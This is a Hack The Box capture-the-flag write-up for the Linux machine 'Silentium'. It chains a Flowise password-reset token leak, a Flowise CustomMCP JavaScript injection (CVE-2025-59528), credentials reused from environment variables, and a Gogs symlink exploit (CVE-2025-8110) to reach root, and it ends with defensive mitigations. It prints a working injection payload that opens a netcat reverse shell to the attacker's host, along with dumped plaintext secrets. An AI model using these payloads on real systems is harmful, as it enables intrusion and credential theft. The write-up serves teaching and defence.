---
title: Silentium
os: Linux
difficulty: Easy
tags:
  - Account Takeover
  - Flowise
  - CVE-2025-59528
  - Environment Credentials
  - Gogs
  - CVE-2025-8110
  - Symlink Bypass
  - Privilege Escalation
date: 2026-04-13
---

# 🛡️ HTB - Silentium (Easy)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Silentium
- **Operating System:** Linux
- **Difficulty:** Easy
- **Date of Scan:** 2026-04-13
- **Vulnerabilities:** Flowise Password Reset Token Leakage (ATO), Flowise CustomMCP Node JavaScript Injection (CVE-2025-59528), Plaintext Environment Credentials, Gogs Symlink Validation Bypass (CVE-2025-8110)

---

## Step 1 - Reconnaissance

We start by running an Nmap scan to identify open ports and services:

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.20.232
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-13 14:13 UTC
Nmap scan report for 10.129.20.232
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/13%OT=22%CT=1%CU=42534%PV=Y%DS=2%DC=T%G=Y%TM=69DC
OS:FA21%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)SEQ(S
OS:P=106%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI
OS:=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP=107%GCD=1%IS
OS:R=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11
OS:NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE8
OS:8%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)
OS:T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=
OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T
OS:6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK
OS:=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   253.72 ms 10.10.14.1
2   248.14 ms 10.129.20.232

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.77 seconds
```

- 🔍 *Linux target system. We scan for active vhosts / subdomains:*

```bash
gobuster vhost -u http://silentium.htb \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain \
  -t 50
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://silentium.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: staging.silentium.htb Status: 200 [Size: 3142]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

- 🔍 *We locate `staging.silentium.htb`. Browsing to it reveals a Flowise (AI agents builder) login page.*
- 🔍 *The registration portal is disabled or non-functional. Let's check the API version:*

```bash
curl -s http://staging.silentium.htb/api/v1/version
```

```json
{"version":"3.0.5"}
```

- 🔍 *Flowise version `3.0.5` is active, which is vulnerable to a critical code injection flaw.*

> [!WARNING]
> **CVE-2025-59528 - Flowise CustomMCP Remote Code Execution:**
> Inside Flowise CustomMCP node configuration, the `convertToValidJSONString` function evaluates user input inside a `Function('return ' + inputString)()` constructor without proper security validation.
> 
> Users can exploit this to pass malicious JavaScript strings that escape context using Node.js modules like `child_process` and execute commands on the container host.

> [!IMPORTANT]
> **Flowise Password Reset Leakage (Account Takeover):**
> In Flowise `3.0.5`, the `/api/v1/account/forgot-password` endpoint leaks the password reset `tempToken` within the response payload.
> 
> An attacker can request a password reset for a target account, capture the leaked token directly from the API response, and reset the password without verifying email ownership.

---

## Step 2 - Initial Foothold

- 🔍 *We need a valid user email address to trigger the forgot-password flow. The main site leadership section lists: `Marcus Throne`, `Ben`, and `Elena Rossi`. We guess the emails and test them against the API:*

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"marcus@silentium.htb"}}'
```

```text
HTTP/1.1 404 Not Found
Server: nginx/1.24.0 (Ubuntu)
Content-Type: application/json; charset=utf-8
Content-Length: 72
{"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
```

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"elena@silentium.htb"}}'
```

```text
HTTP/1.1 404 Not Found
Server: nginx/1.24.0 (Ubuntu)
Content-Type: application/json; charset=utf-8
Content-Length: 72
{"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
```

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

```text
HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Content-Type: application/json; charset=utf-8
Content-Length: 579

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"TLqOeJRfcrakNlmuZiHuzcVEKvG1XW1l67fkpi07hKRVcIxULoOcOZOezwvRkCFx","tokenExpiry":"2026-04-16T15:09:02.045Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-16T14:54:02.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

- 🔍 *We capture a valid `tempToken` for `ben@silentium.htb`. We use this token to update the account password via the password reset portal, and log in.*
- 🔍 *Now authenticated, we exploit the CustomMCP node RCE (CVE-2025-59528) to trigger a reverse shell:*

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"nc 10.10.14.253 4444 -e /bin/sh\");return 1;})()})"
    }
  }'
```

- 🔍 *We catch the reverse shell inside the container on our listener:*

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.14.253] from (UNKNOWN) [10.129.37.52] 33587
# whoami
root
```

- 🔍 *We are running as root inside a Docker container. Let's dump the environment variables:*

```bash
env
```

```text
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

- 🔍 *We obtain two plaintext password candidates: `F1l3_d0ck3r` and `r04D!!_R4ge`. We attempt to authenticate via SSH on the host machine. The SMTP password (`r04D!!_R4ge`) succeeds:*

```bash
ssh ben@silentium.htb
```

```text
ben@silentium.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
...
ben@silentium:~$ 
```

---

## Step 3 - Privilege Escalation

- 🔍 *We check our sudo permissions but discover we cannot run sudo:*

```bash
sudo -l
```

```text
[sudo] password for ben: 
Sorry, user ben may not run sudo on silentium.
```

- 🔍 *We check local binaries and directories, finding a `gogs` folder in `/opt`:*

```bash
cd /opt/gogs
ls -la gogs
```

```text
drwxr-xr-x 6 root root     4096 Apr  8 09:41 .
drwxr-xr-x 6 root root     4096 Apr  8 09:41 ..
drwxr-xr-x 3 root root     4096 Apr  8 09:41 custom                                               
drwxr-xr-x 3 root root     4096 Apr  8 09:41 data
-rwxr-xr-x 1 root root 81220896 Jun  9  2025 gogs
-rwxr-xr-x 1 root root     1054 Jun  9  2025 LICENSE                                              
drwxr-xr-x 2 root root     4096 Apr  8 09:41 log
-rwxr-xr-x 1 root root     6626 Jun  9  2025 README.md                                            
-rwxr-xr-x 1 root root     5385 Jun  9  2025 README_ZH.md                                         
drwxr-xr-x 7 root root     4096 Apr  8 09:41 scripts 
```

- 🔍 *We execute the binary with `--help` to confirm the version of the running Gogs instance:*

```bash
/opt/gogs/gogs/gogs --help
```

```text
NAME:
   Gogs - A painless self-hosted Git service

USAGE:
   gogs [global options] command [command options] [arguments...]

VERSION:
   0.13.3

COMMANDS:
   web      Start web server
   serv     This command should only be called by SSH shell
   hook     Delegate commands to corresponding Git hooks
   cert     Generate self-signed certificate
   admin    Perform admin operations on command line
   import   Import portable data as local Gogs data
   backup   Backup files and database
   restore  Restore files and database from backup
   help, h  Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --help, -h     show help
   --version, -v  print the version
```

- 🔍 *Gogs version `0.13.3` is running. Let's locate its active local port using `netstat`:*

```bash
netstat -lantp
```

```text
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:37631         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8025          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp        0   1096 10.129.78.103:22       10.10.13.68:46408       ESTABLISHED -
```

- 🔍 *We verify port `3001` is hosting the Gogs server:*

```bash
curl http://127.0.0.1:3001 | head
```

```text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  80<!DOCTYPE html>  0     0      0      0 --:--:-- --:--:-- --:--:--     0
49<html>
  <head data-suburl="">
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
         <meta name="author" content="Gogs" />
        <meta name="description" content="Gogs is a painless self-hosted Git service" />
        <meta name="keywords" content="go, git, self-hosted, gogs">
```

> [!WARNING]
> **CVE-2025-8110 - Gogs Symlink Validation Bypass RCE:**
> Gogs fails to validate symbolic links recursively during repository updates. Attackers can commit a symlink pointing to `.git/config`, then use the file update API to write configuration data through the symlink. By editing `core.sshCommand`, they achieve arbitrary OS command execution when Git operations run.

- 🔍 *To access the Gogs portal on port 3001, we forward it to port 9000 on our local machine using `chisel`:*

```bash
# On our attack host (start server):
./chisel-lin server --reverse --port 8080

# On the target host (start client):
./chisel-lin.1 client 10.10.14.253:8080 R:9000:127.0.0.1:3001
```

```text
# Server logs
2026/04/17 15:31:35 server: Reverse tunnelling enabled
2026/04/17 15:31:35 server: Listening on http://0.0.0.0:8080
```

- 🔍 *We register a user via the Gogs portal at `http://127.0.0.1:9000`. (Note: Remove the `register()` function call from the Python exploit script to avoid registration failures caused by CAPTCHA, and specify your newly registered credentials in the script).*
- 🔍 *We run the exploit to target Gogs:*

```bash
python3 CVE-2025-8110.py -u http://127.0.0.1:9000 -lh "10.10.14.253" -lp 6000
```

```text
[+] Authenticated successfully
Token generation status: 200
[+] Application token: 
863677e362a2653555cfe44b94d54a4e7c8a75ba
Repo creation status: 201
Cloning into '/tmp/4f9ffc2db849'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (3/3), 249 bytes | 249.00 KiB/s, done.
[master f02218c] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 3 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 295 bytes | 295.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
To http://127.0.0.1:9000/test/4f9ffc2db849.git
   755353d..f02218c  master -> master
[+] Exploit sent, check your listener!
[-] Error: HTTPConnectionPool(host='127.0.0.1', port=9000): Read timed out. (read timeout=5)
```

- 🔍 *We catch our root shell on the netcat listener:*

```bash
nc -lvnp 6000
```

```text
listening on [any] 6000 ...
connect to [10.10.14.253] from (UNKNOWN) [10.129.38.127] 58482
bash: cannot set terminal process group (1485): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# whoami
root
```

- 🔍 *We retrieve the root flag from `/root/root.txt`:*

```bash
cat /root/root.txt
```

```text
f3e098a7************************
```

- 🔍 *Full Host Compromised.*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Infrastructure & Container Security Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Silentium environment. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Flowise Password Reset Token Leakage

> [!WARNING]
> **Vulnerability Profile:**
> The `forgot-password` API endpoint leaks the generated password reset `tempToken` in the response body.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Unauthenticated attackers can query the endpoint for any valid email addresses and harvest the reset token directly, achieving immediate account takeover (ATO) and administrative access to the platform.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Patch Flowise immediately. Restructure the password reset endpoint response to strictly exclude the token value, delivering it solely via secure email pathways.
> - **Detection:** Audit web traffic logs for high frequencies of requests to `/forgot-password` endpoints.

---

### 🔴 Flowise CustomMCP Arbitrary Code Execution (CVE-2025-59528)

> [!WARNING]
> **Vulnerability Profile:**
> The CustomMCP node evaluates user-supplied configuration settings inside a `Function()` constructor.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Authenticated users can inject arbitrary Node.js commands that run with the full privileges of the Flowise process, leading to container compromise.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update Flowise to a patched version that sanitizes or whitelists MCP configurations and avoids dynamic execution functions.
> - **Remediation:** Implement strong container isolation: run the application container with restricted, non-root users.

---

### 🔴 Gogs Symlink Validation Bypass (CVE-2025-8110)

> [!WARNING]
> **Vulnerability Profile:**
> Gogs fails to validate symbolic links recursively during repository updates, allowing arbitrary writes to `.git/config`.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Attackers can modify `core.sshCommand` to execute arbitrary OS commands as the Gogs service owner. Since the Gogs service runs as `root`, this results in immediate host root compromise.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Upgrade Gogs to version 0.13.4 or newer where symlink verification is enforced recursively.
> - **Remediation:** Enforce least privilege: never execute web services (like Gogs) as `root`. Restrict the service execution context to a dedicated unprivileged user (e.g. `git`).
